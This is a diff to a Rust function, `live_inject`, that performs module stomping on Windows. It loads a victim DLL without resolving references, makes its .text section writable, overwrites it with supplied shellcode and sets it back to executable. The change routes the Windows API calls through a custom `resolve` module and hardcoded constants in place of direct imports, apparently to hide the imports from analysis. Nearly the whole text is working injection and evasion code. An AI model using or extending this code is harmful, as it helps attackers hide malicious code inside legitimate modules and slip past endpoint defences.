@@ -8,20 +8,11 @@ pub fn victim_dll() -> String {
 #[cfg(windows)]
 pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, String> {
     use std::ffi::CString;
-    use windows::Win32::System::Memory::{
-        VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-    };
-
-    #[link(name = "kernel32")]
-    extern "system" {
-        fn LoadLibraryExA(
-            lpLibFileName: *const u8,
-            hFile: *mut std::ffi::c_void,
-            dwFlags: u32,
-        ) -> *mut std::ffi::c_void;
-    }
+    use crate::resolve;
 
     const DONT_RESOLVE_DLL_REFERENCES: u32 = 0x0000_0001;
+    const PAGE_READWRITE: u32 = 0x04;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
 
     let victim = victim_dll();
     let dll_name = CString::new(victim.as_str())
@@ -29,7 +20,7 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
 
     log.step("[1/5] LoadLibraryExA(victim, DONT_RESOLVE_DLL_REFERENCES)".to_string());
     let module = unsafe {
-        LoadLibraryExA(
+        resolve::LoadLibraryExA(
             dll_name.as_ptr() as *const u8,
             std::ptr::null_mut(),
             DONT_RESOLVE_DLL_REFERENCES,
@@ -60,16 +51,18 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
         "[3/5] VirtualProtect(.text, PAGE_READWRITE) — {} bytes",
         text.size
     ));
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    unsafe {
-        VirtualProtect(
+    let mut old_protect: u32 = 0;
+    let ok = unsafe {
+        resolve::VirtualProtect(
             text.base as *const std::ffi::c_void,
             text.size,
             PAGE_READWRITE,
             &mut old_protect,
         )
+    };
+    if ok == 0 {
+        return Err("VirtualProtect(RW) failed".to_string());
     }
-    .map_err(|e| format!("VirtualProtect(RW) failed: {e}"))?;
 
     log.step(format!(
         "[4/5] Overwrite .text with {} bytes of shellcode",
@@ -84,15 +77,17 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
     }
 
     log.step("[5/5] VirtualProtect(.text, PAGE_EXECUTE_READ)".to_string());
-    unsafe {
-        VirtualProtect(
+    let ok = unsafe {
+        resolve::VirtualProtect(
             text.base as *const std::ffi::c_void,
             text.size,
             PAGE_EXECUTE_READ,
             &mut old_protect,
         )
+    };
+    if ok == 0 {
+        return Err("VirtualProtect(RX) failed".to_string());
     }
-    .map_err(|e| format!("VirtualProtect(RX) failed: {e}"))?;
 
     log.info(format!(
         "  ✓ Module stomped: shellcode at 0x{:016X} inside victim .text",
